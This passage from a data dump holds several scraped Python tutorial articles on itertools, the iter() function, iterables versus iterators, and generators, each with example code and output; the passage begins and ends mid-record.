    "text": "Python\u2019s Itertool is a module that provides various functions that work on iterators to produce complex iterators. This module works as a fast, memory-efficient tool that is used either by themselves or in combination to form iterator algebra.\u00a0For example, let\u2019s suppose there are two lists and you want to multiply their elements. There can be several ways of achieving this. One can be using the naive approach i.e by iterating through the elements of both the list simultaneously and multiply them. And another approach can be using the map function i.e by passing the mul operator as a first parameter to the map function and Lists as the second and third parameter to this function. Let\u2019s see the time taken by each approach.\u00a0Python3# Python program to demonstrate# iterator module\u00a0\u00a0import operatorimport time\u00a0# Defining listsL1 = [1, 2, 3]L2 = [2, 3, 4]\u00a0# Starting time before map# functiont1 = time.time()\u00a0# Calculating resulta, b, c = map(operator.mul, L1, L2)\u00a0# Ending time after map# functiont2 = time.time()\u00a0# Time taken by map functionprint(\"Result:\", a, b, c)print(\"Time taken by map function: %.6f\" %(t2 - t1))\u00a0# Starting time before naive# methodt1 = time.time()\u00a0# Calculating result using for loopprint(\"Result:\", end = \" \")for i in range(3):\u00a0\u00a0\u00a0\u00a0print(L1[i] * L2[i], end = \" \")\u00a0\u00a0\u00a0\u00a0\u00a0# Ending time after naive# methodt2 = time.time()print(\"\\nTime taken by for loop: %.6f\" %(t2 - t1))Output:Result: 2 6 12\nTime taken by map function: 0.000005\nResult: 2 6 12 \nTime taken by for loop: 0.000014In the above example, it can be seen that the time taken by the map function is approximately half than the time taken by for loop. This shows that itertools are fast, memory-efficient tools.Different types of iterators provided by this module are:\u00a0Infinite iteratorsCombinatoric iteratorsTerminating iteratorsInfinite iteratorsIterator in Python is any Python type that can be used with a \u2018for in loop\u2019. Python lists, tuples, dictionaries, and sets are all examples of inbuilt iterators. But it is not necessary that an iterator object has to exhaust, sometimes it can be infinite. Such types of iterators are known as Infinite iterators.Python provides three types of infinite iterators:\u00a0count(start, step): This iterator starts printing from the \u201cstart\u201d number and prints infinitely. If steps are mentioned, the numbers are skipped else step is 1 by default. See the below example for its use with for in loop.Example:Python3# Python program to demonstrate# infinite iterators\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0# for in loopfor i in itertools.count(5, 5):\u00a0\u00a0\u00a0\u00a0if i == 35:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end =\" \")Output:5 10 15 20 25 30cycle(iterable): This iterator prints all values in order from the passed container. It restarts printing from the beginning again when all elements are printed in a cyclic manner.Example 1:Python3# Python program to demonstrate# infinite iterators\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0count = 0\u00a0\u00a0\u00a0# for in loopfor i in itertools.cycle('AB'):\u00a0\u00a0\u00a0\u00a0if count > 7:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end = \" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0count += 1Output:A B A B A B A B Example 2: Using the next function.Python3# Python program to demonstrate# infinite iterators\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0l = ['Geeks', 'for', 'Geeks']\u00a0\u00a0\u00a0# defining iteratoriterators = itertools.cycle(l)\u00a0\u00a0\u00a0# for in loopfor i in range(6):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Using next function\u00a0\u00a0\u00a0\u00a0print(next(iterators), end = \" \")Combinatoric iterators\u00a0Output:Geeks for Geeks Geeks for Geeks repeat(val, num): This iterator repeatedly prints the passed value an infinite number of times. If the optional keyword num is mentioned, then it repeatedly prints num number of times.Example:Python3# Python code to demonstrate the working of\u00a0\u00a0# repeat()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# importing \"itertools\" for iterator operations\u00a0import itertools\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# using repeat() to repeatedly print number\u00a0print (\"Printing the numbers repeatedly : \")\u00a0print (list(itertools.repeat(25, 4)))Output:Printing the numbers repeatedly : \n[25, 25, 25, 25]Combinatoric iteratorsThe recursive generators that are used to simplify combinatorial constructs such as permutations, combinations, and Cartesian products are called combinatoric iterators.In Python there are 4 combinatoric iterators:\u00a0Product(): This tool computes the cartesian product of input iterables. To compute the product of an iterable with itself, we use the optional repeat keyword argument to specify the number of repetitions. The output of this function is tuples in sorted order.Example:Python3# import the product function from itertools modulefrom itertools import product\u00a0\u00a0\u00a0print(\"The cartesian product using repeat:\")print(list(product([1, 2], repeat = 2)))print()\u00a0\u00a0\u00a0print(\"The cartesian product of the containers:\")print(list(product(['geeks', 'for', 'geeks'], '2')))print()\u00a0\u00a0\u00a0print(\"The cartesian product of the containers:\")print(list(product('AB', [3, 4])))Output:The cartesian product using repeat:\n[(1, 1), (1, 2), (2, 1), (2, 2)]\n\nThe cartesian product of the containers:\n[('geeks', '2'), ('for', '2'), ('geeks', '2')]\n\nThe cartesian product of the containers:\n[('A', 3), ('A', 4), ('B', 3), ('B', 4)]Permutations(): Permutations() as the name speaks for itself is used to generate all possible permutations of an iterable. All elements are treated as unique based on their position and not their values. This function takes an iterable and group_size, if the value of group_size is not specified or is equal to None then the value of group_size becomes the length of the iterable.Example:Python3# import the product function from itertools modulefrom itertools import permutations\u00a0\u00a0\u00a0print (\"All the permutations of the given list is:\")\u00a0print (list(permutations([1, 'geeks'], 2)))print()\u00a0\u00a0Terminating iteratorsprint (\"All the permutations of the given string is:\")\u00a0print (list(permutations('AB')))print()\u00a0\u00a0\u00a0print (\"All the permutations of the given container is:\")\u00a0print(list(permutations(range(3), 2)))Output:All the permutations of the given list is:\n[(1, 'geeks'), ('geeks', 1)]\n\nAll the permutations of the given string is:\n[('A', 'B'), ('B', 'A')]\n\nAll the permutations of the given container is:\n[(0, 1), (0, 2), (1, 0), (1, 2), (2, 0), (2, 1)]Combinations(): This iterator prints all the possible combinations(without replacement) of the container passed in arguments in the specified group size in sorted order.Example:Python3# import combinations from itertools module\u00a0\u00a0\u00a0from itertools import combinations\u00a0\u00a0\u00a0print (\"All the combination of list in sorted order(without replacement) is:\")\u00a0print(list(combinations(['A', 2], 2)))print()\u00a0\u00a0\u00a0print (\"All the combination of string in sorted order(without replacement) is:\")print(list(combinations('AB', 2)))print()\u00a0\u00a0\u00a0print (\"All the combination of list in sorted order(without replacement) is:\")print(list(combinations(range(2), 1)))Output:All the combination of list in sorted order(without replacement) is:\n[('A', 2)]\n\nAll the combination of string in sorted order(without replacement) is:\n[('A', 'B')]\n\nAll the combination of list in sorted order(without replacement) is:\n[(0, ), (1, )]Combinations_with_replacement(): This function returns a subsequence of length n from the elements of the iterable where n is the argument that the function takes determining the length of the subsequences generated by the function. Individual elements may repeat itself in combinations_with_replacement function.Example:Python3# import combinations from itertools module\u00a0\u00a0\u00a0from itertools import combinations_with_replacement\u00a0\u00a0\u00a0print (\"All the combination of string in sorted order(with replacement) is:\")print(list(combinations_with_replacement(\"AB\", 2)))print()\u00a0\u00a0\u00a0print (\"All the combination of list in sorted order(with replacement) is:\")print(list(combinations_with_replacement([1, 2], 2)))print()\u00a0\u00a0\u00a0print (\"All the combination of container in sorted order(with replacement) is:\")print(list(combinations_with_replacement(range(2), 1)))Output:All the combination of string in sorted order(with replacement) is:\n[('A', 'A'), ('A', 'B'), ('B', 'B')]\n\nAll the combination of list in sorted order(with replacement) is:\n[(1, 1), (1, 2), (2, 2)]\n\nAll the combination of container in sorted order(with replacement) is:\n[(0, ), (1, )]Terminating iteratorsTerminating iteratorsTerminating iterators are used to work on the short input sequences and produce the output based on the functionality of the method used.Different types of terminating iterators are:\u00a0accumulate(iter, func): This iterator takes two arguments, iterable target and the function which would be followed at each iteration of value in target. If no function is passed, addition takes place by default. If the input iterable is empty, the output iterable will also be empty.Example:Python3# Python code to demonstrate the working of\u00a0# accumulate()\u00a0\u00a0import itertoolsimport operator\u00a0# initializing list 1li1 = [1, 4, 5, 7]\u00a0\u00a0\u00a0# using accumulate()# prints the successive summation of elementsprint (\"The sum after each iteration is : \", end =\"\")print (list(itertools.accumulate(li1)))\u00a0\u00a0\u00a0# using accumulate()# prints the successive multiplication of elementsprint (\"The product after each iteration is : \", end =\"\")print (list(itertools.accumulate(li1, operator.mul)))\u00a0\u00a0\u00a0# using accumulate()# prints the successive summation of elementsprint (\"The sum after each iteration is : \", end =\"\")print (list(itertools.accumulate(li1)))\u00a0\u00a0\u00a0# using accumulate()# prints the successive multiplication of elementsprint (\"The product after each iteration is : \", end =\"\")print (list(itertools.accumulate(li1, operator.mul)))Output:The sum after each iteration is : [1, 5, 10, 17]\nThe product after each iteration is : [1, 4, 20, 140]\nThe sum after each iteration is : [1, 5, 10, 17]\nThe product after each iteration is : [1, 4, 20, 140]chain(iter1, iter2..): This function is used to print all the values in iterable targets one after another mentioned in its arguments.Example:Python3# Python code to demonstrate the working of\u00a0# and chain()\u00a0\u00a0\u00a0\u00a0import itertools\u00a0# initializing list 1li1 = [1, 4, 5, 7]\u00a0\u00a0\u00a0# initializing list 2li2 = [1, 6, 5, 9]\u00a0\u00a0\u00a0# initializing list 3li3 = [8, 10, 5, 4]\u00a0# using chain() to print all elements of listsprint (\"All values in mentioned chain are : \", end =\"\")print (list(itertools.chain(li1, li2, li3)))Output:All values in mentioned chain are : [1, 4, 5, 7, 1, 6, 5, 9, 8, 10, 5, 4]chain.from_iterable(): This function is implemented similarly as a chain() but the argument here is a list of lists or any other iterable container.Example:Python3# Python code to demonstrate the working of\u00a0# chain.from_iterable()\u00a0\u00a0import itertools\u00a0\u00a0# initializing list 1li1 = [1, 4, 5, 7]\u00a0\u00a0\u00a0# initializing list 2li2 = [1, 6, 5, 9]\u00a0\u00a0\u00a0# initializing list 3li3 = [8, 10, 5, 4]\u00a0\u00a0\u00a0# initializing list of listli4 = [li1, li2, li3]\u00a0# using chain.from_iterable() to print all elements of listsprint (\"All values in mentioned chain are : \", end =\"\")print (list(itertools.chain.from_iterable(li4)))Output:All values in mentioned chain are : [1, 4, 5, 7, 1, 6, 5, 9, 8, 10, 5, 4]compress(iter, selector): This iterator selectively picks the values to print from the passed container according to the boolean list value passed as other arguments. The arguments corresponding to boolean true are printed else all are skipped.Example:Python3# Python code to demonstrate the working of\u00a0# and compress()\u00a0\u00a0import itertools\u00a0\u00a0# using compress() selectively print data valuesprint (\"The compressed values in string are : \", end =\"\")print (list(itertools.compress('GEEKSFORGEEKS', [1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0])))Output:The compressed values in string are : ['G', 'F', 'G']dropwhile(func, seq): This iterator starts printing the characters only after the func. in argument returns false for the first time.Example:Python3# Python code to demonstrate the working of\u00a0# dropwhile()\u00a0\u00a0import itertools\u00a0\u00a0# initializing list\u00a0li = [2, 4, 5, 7, 8]\u00a0\u00a0\u00a0# using dropwhile() to start displaying after condition is falseprint (\"The values after condition returns false : \", end =\"\")print (list(itertools.dropwhile(lambda x : x % 2 == 0, li)))Output:The values after condition returns false : [5, 7, 8]filterfalse(func, seq): As the name suggests, this iterator prints only values that return false for the passed function.Example:Python3# Python code to demonstrate the working of\u00a0# filterfalse()\u00a0\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0# initializing list\u00a0li = [2, 4, 5, 7, 8]\u00a0# using filterfalse() to print false valuesprint (\"The values that return false to function are : \", end =\"\")print (list(itertools.filterfalse(lambda x : x % 2 == 0, li)))Output:The values that return false to function are : [5, 7]islice(iterable, start, stop, step): This iterator selectively prints the values mentioned in its iterable container passed as argument. This iterator takes 4 arguments, iterable container, starting pos., ending position and step.Example:Python3# Python code to demonstrate the working of\u00a0# islice()\u00a0\u00a0\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0# initializing list\u00a0li = [2, 4, 5, 7, 8, 10, 20]\u00a0\u00a0\u00a0\u00a0\u00a0# using islice() to slice the list acc. to need# starts printing from 2nd index till 6th skipping 2print (\"The sliced list values are : \", end =\"\")print (list(itertools.islice(li, 1, 6, 2)))Output:The sliced list values are : [4, 7, 10]starmap(func., tuple list): This iterator takes a function and tuple list as argument and returns the value according to the function from each tuple of the list.Example:Python3# Python code to demonstrate the working of\u00a0# starmap()\u00a0\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# initializing tuple listli = [ (1, 10, 5), (8, 4, 1), (5, 4, 9), (11, 10, 1) ]\u00a0\u00a0\u00a0# using starmap() for selection value acc. to function# selects min of all tuple valuesprint (\"The values acc. to function are : \", end =\"\")print (list(itertools.starmap(min, li)))Output:The values acc. to function are : [1, 1, 4, 1]takewhile(func, iterable): This iterator is the opposite of dropwhile(), it prints the values till the function returns false for 1st time.Example:Python3# Python code to demonstrate the working of\u00a0# takewhile()\u00a0\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0# initializing list\u00a0li = [2, 4, 6, 7, 8, 10, 20]\u00a0\u00a0\u00a0# using takewhile() to print values till condition is false.print (\"The list values till 1st false value are : \", end =\"\")print (list(itertools.takewhile(lambda x : x % 2 == 0, li )))Output:The list values till 1st false value are : [2, 4, 6]tee(iterator, count):- This iterator splits the container into a number of iterators mentioned in the argument.Example:Python3# Python code to demonstrate the working of\u00a0# tee()\u00a0\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0# initializing list\u00a0li = [2, 4, 6, 7, 8, 10, 20]\u00a0\u00a0\u00a0# storing list in iteratoriti = iter(li)\u00a0\u00a0\u00a0\u00a0# using tee() to make a list of iterators# makes list of 3 iterators having same values.it = itertools.tee(iti, 3)\u00a0\u00a0\u00a0# printing the values of iteratorsprint (\"The iterators are : \")for i in range (0, 3):\u00a0\u00a0\u00a0\u00a0print (list(it[i]))Output:The iterators are : \n[2, 4, 6, 7, 8, 10, 20]\n[2, 4, 6, 7, 8, 10, 20]\n[2, 4, 6, 7, 8, 10, 20]zip_longest( iterable1, iterable2, fillval): This iterator prints the values of iterables alternatively in sequence. If one of the iterables is printed fully, the remaining values are filled by the values assigned to fillvalue.Example:Python3# Python code to demonstrate the working of\u00a0# zip_longest()\u00a0\u00a0\u00a0\u00a0import itertools\u00a0\u00a0\u00a0# using zip_longest() to combine two iterables.print (\"The combined values of iterables is\u00a0 : \")print (*(itertools.zip_longest('GesoGes', 'ekfrek', fillvalue ='_' )))Output:The combined values of iterables is  : \n('G', 'e') ('e', 'k') ('s', 'f') ('o', 'r') ('G', 'e') ('e', 'k') ('s', '_')\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "75426d213ad4bd2597176d53abbae5a2",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "At many instances, we get a need to access an object like an iterator. One way is to form a generator loop but that extends the task and time taken by the programmer. Python eases this task by providing a built-in method __iter__() for this task.The __iter__() function returns an iterator for the given object (array, set, tuple, etc. or custom objects). It creates an object that can be accessed one element at a time using __next__() function, which generally comes in handy when dealing with loops.Syntax :\u00a0iter(object)\niter(callable, sentinel)Object: The object whose iterator has to be created. It can be a collection object like list or tuple or a user-defined object (using OOPS).Callable, Sentinel: Callable represents a callable object, and sentinel is the value at which the iteration is needed to be terminated, sentinel value represents the end of sequence being iterated.Exception :\u00a0\u00a0If we call the iterator after all the elements have \nbeen iterated, then StopIterationError is raised.The __iter__() function returns an iterator object that goes through each element of the given object. The next element can be accessed through __next__() function. In the case of callable object and sentinel value, the iteration is done until the value is found or the end of elements reached. In any case, the original object is not modified.Code #1 :\u00a0\u00a0Python3# Python code demonstrating# basic use of iter()listA = ['a','e','i','o','u']\u00a0iter_listA = iter(listA)\u00a0try:\u00a0\u00a0\u00a0\u00a0print( next(iter_listA))\u00a0\u00a0\u00a0\u00a0print( next(iter_listA))\u00a0\u00a0\u00a0\u00a0print( next(iter_listA))\u00a0\u00a0\u00a0\u00a0print( next(iter_listA))\u00a0\u00a0\u00a0\u00a0print( next(iter_listA))\u00a0\u00a0\u00a0\u00a0print( next(iter_listA)) #StopIteration errorexcept:\u00a0\u00a0\u00a0\u00a0passOutput :\u00a0a\ne\ni\no\nuCode #2 :\u00a0Python3# Python code demonstrating# basic use of iter()lst = [11, 22, 33, 44, 55]\u00a0iter_lst = iter(lst)while True:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(iter_lst.__next__())\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0breakOutput :\u00a011\n22\n33\n44\n55Code #3 :\u00a0\u00a0Python3# Python code demonstrating# basic use of iter()\u00a0listB = ['Cat', 'Bat', 'Sat', 'Mat']\u00a0\u00a0iter_listB = listB.__iter__()\u00a0try:\u00a0\u00a0\u00a0\u00a0print(iter_listB.__next__())\u00a0\u00a0\u00a0\u00a0print(iter_listB.__next__())\u00a0\u00a0\u00a0\u00a0print(iter_listB.__next__())\u00a0\u00a0\u00a0\u00a0print(iter_listB.__next__())\u00a0\u00a0\u00a0\u00a0print(iter_listB.__next__()) #StopIteration errorexcept:\u00a0\u00a0\u00a0\u00a0print(\" \\nThrowing 'StopIterationError'\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"I cannot count more.\")Output :\u00a0Cat\nBat\nSat\nMat\n \nThrowing 'StopIterationError' I cannot count more.Code #4 : User-defined objects (using OOPS)\u00a0Python3# Python code showing use of iter() using OOPs\u00a0class Counter:\u00a0\u00a0\u00a0\u00a0def __init__(self, start, end):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.num = start\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.end = end\u00a0\u00a0\u00a0\u00a0\u00a0def __iter__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self\u00a0\u00a0\u00a0\u00a0\u00a0def __next__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if self.num > self.end:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise StopIteration\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.num += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.num - 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver codeif __name__ == '__main__' :\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a, b = 2, 5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c1 = Counter(a, b)\u00a0\u00a0\u00a0\u00a0c2 = Counter(a, b)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Way 1-to print the range without iter()\u00a0\u00a0\u00a0\u00a0print (\"Print the range without iter()\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in c1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Eating more Pizzas, counting \", i, end =\"\\n\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"\\nPrint the range using iter()\\n\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Way 2- using iter()\u00a0\u00a0\u00a0\u00a0obj = iter(c2)\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0while True: # Print till error raised\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Eating more Pizzas, counting \", next(obj))\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# when StopIteration raised, Print custom message\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"\\nDead on overfood, GAME OVER\")OutputPrint the range without iter()\nEating more Pizzas, counting  2\nEating more Pizzas, counting  3\nEating more Pizzas, counting  4\nEating more Pizzas, counting  5\n\nPrint the range using iter()\n\nEating more Pizzas, counting  2\nEating more Pizzas, counting  3\nEating more Pizzas, counting  4\nEating more Pizzas, counting  5\n\nDead on overfood, GAME OVERMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "861176e0c9ce6b0f088a0e486174dfce",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Iterable is an object, which one can iterate over. It generates an Iterator when passed to iter() method. Iterator is an object, which is used to iterate over an iterable object using __next__() method. Iterators have __next__() method, which returns the next item of the object.Note that every iterator is also an iterable, but not every iterable is an iterator. For example, a list is iterable but a list is not an iterator. An iterator can be created from an iterable by using the function iter(). To make this possible, the class of an object needs either a method __iter__, which returns an iterator, or a __getitem__ method with sequential indexes starting with 0.Code #1 :for city in [\"Berlin\", \"Vienna\", \"Zurich\"]:\u00a0\u00a0\u00a0\u00a0print(city)\u00a0\u00a0print(\"\\n\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for city in (\"Python\", \"Perl\", \"Ruby\"):\u00a0\u00a0\u00a0\u00a0print(city)\u00a0\u00a0print(\"\\n\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for char in \"Iteration is easy\":\u00a0\u00a0\u00a0\u00a0print(char, end = \" \")Output :Berlin\r\nVienna\r\nZurich\r\n\r\nPython\r\nPerl\r\nRuby\r\n\r\nI t e r a t i o n   i s   e a s y \u00a0When a for loop is executed, for statement calls iter() on the object, which it is supposed to loop over. If this call is successful, the iter call will return an iterator object that defines the method __next__(), which accesses elements of the object one at a time. The __next__() method will raise a StopIteration exception, if there are no further elements available. The for loop will terminate as soon as it catches a StopIteration exception.\u00a0Let\u2019s call the __next__() method using the next() built-in function.Code #2 : Function \u2018iterable\u2019 will return True, if the object \u2018obj\u2019 is an iterable and False otherwise.# list of citiescities = [\"Berlin\", \"Vienna\", \"Zurich\"]\u00a0\u00a0# initialize the objectiterator_obj = iter(cities)\u00a0\u00a0print(next(iterator_obj))print(next(iterator_obj))print(next(iterator_obj))Output :\r\nBerlin\r\nVienna\r\nZurich\r\nNote: If \u2018next(iterator_obj)\u2019 is called one more time, it would return \u2018StopIteration\u2019.\u00a0Code #3 : Check object is iterable or not# Function to check object# is iterable or not\u00a0def iterable(obj):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0iter(obj)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except TypeError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0# Driver Code\u00a0\u00a0\u00a0\u00a0\u00a0for element in [34, [4, 5], (4, 5),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{\"a\":4}, \"dfsdf\", 4.5]:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(element, \" is iterable : \", iterable(element))Output :\r\n34  is iterable :  False\r\n[4, 5]  is iterable :  True\r\n(4, 5)  is iterable :  True\r\n{'a': 4}  is iterable :  True\r\ndfsdf  is iterable :  True\r\n4.5  is iterable :  False\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3e5d67dd3596d2b4f1bd44f97d537d9f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisites: Yield Keyword and IteratorsThere are two terms involved when we discuss generators.Generator-Function : A generator-function is defined like a normal function, but whenever it needs to generate a value, it does so with the yield keyword rather than return. If the body of a def contains yield, the function automatically becomes a generator function.# A generator function that yields 1 for first time,# 2 second time and 3 third timedef simpleGeneratorFun():\u00a0\u00a0\u00a0\u00a0yield 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield 2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield 3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver code to check above generator functionfor value in simpleGeneratorFun():\u00a0\u00a0\u00a0\u00a0\u00a0print(value)Output :\r\n1\r\n2\r\n3Generator-Object : Generator functions return a generator object. Generator objects are used either by calling the next method on the generator object or using the generator object in a \u201cfor in\u201d loop (as shown in the above program).# A Python program to demonstrate use of\u00a0# generator object with next()\u00a0\u00a0\u00a0# A generator functiondef simpleGeneratorFun():\u00a0\u00a0\u00a0\u00a0yield 1\u00a0\u00a0\u00a0\u00a0yield 2\u00a0\u00a0\u00a0\u00a0yield 3\u00a0\u00a0\u00a0# x is a generator objectx = simpleGeneratorFun()\u00a0\u00a0# Iterating over the generator object using nextprint(x.next()) # In Python 3, __next__()print(x.next())print(x.next())Output :\r\n1\r\n2\r\n3So a generator function returns an generator object that is iterable, i.e., can be used as an Iterators .As another example, below is a generator for Fibonacci Numbers.# A simple generator for Fibonacci Numbersdef fib(limit):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Initialize first two Fibonacci Numbers\u00a0\u00a0\u00a0\u00a0\u00a0a, b = 0, 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# One by one yield next Fibonacci Number\u00a0\u00a0\u00a0\u00a0while a < limit:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a, b = b, a + b\u00a0\u00a0# Create a generator objectx = fib(5)\u00a0\u00a0# Iterating over the generator object using nextprint(x.next()) # In Python 3, __next__()print(x.next())print(x.next())print(x.next())print(x.next())\u00a0\u00a0# Iterating over the generator object using for# in loop.print(\"\\nUsing for in loop\")for i in fib(5):\u00a0\u00a0\u00a0\u00a0\u00a0print(i)Output :0\r\n1\r\n1\r\n2\r\n3\r\n\r\nUsing for in loop\r\n0\r\n1\r\n1\r\n2\r\n3Applications : Suppose we to create a stream of Fibonacci numbers, adopting the generator approach makes it trivial; we just have to call next(x) to get the next Fibonacci number without bothering about where or when the stream of numbers ends.A more practical type of stream processing is handling large data files such as log files. Generators provide a space efficient method for such data processing as only parts of the file are handled at one given point in time. We can also use Iterators for these purposes, but Generator provides a quick way (We don\u2019t need to write __next__ and __iter__ methods here).Refer below link for more advanced applications of generators in Python.http://www.dabeaz.com/finalgenerator/This article is contributed by Shwetanshu Rohatgi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "24788859b8f004e1a49333a58fa34cd4",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In Python, to create iterators, we can use both regular functions and generators. Generators are written just like a normal function but we use yield() instead of return() for returning a result. It is more powerful as a tool to implement iterators. It is easy and more convenient to implement because it offers the evaluation of elements on demand. Unlike regular functions which on encountering a return statement terminates entirely, generators use a yield statement in which the state of the function is saved from the last call and can be picked up or resumed the next time we call a generator function. Another great advantage of the generator over a list is that it takes much less memory.\u00a0In addition to that, two more functions _next_() and _iter_() make the generator function more compact and reliable. Example :\u00a0Python3# Python code to illustrate generator, yield() and next().def generator():\u00a0\u00a0\u00a0\u00a0t = 1\u00a0\u00a0\u00a0\u00a0print ('First result is ',t)\u00a0\u00a0\u00a0\u00a0yield t\u00a0\u00a0\u00a0\u00a0\u00a0t += 1\u00a0\u00a0\u00a0\u00a0print ('Second result is ',t)\u00a0\u00a0\u00a0\u00a0yield t\u00a0\u00a0\u00a0\u00a0\u00a0t += 1\u00a0\u00a0\u00a0\u00a0print('Third result is ',t)\u00a0\u00a0\u00a0\u00a0yield t\u00a0call = 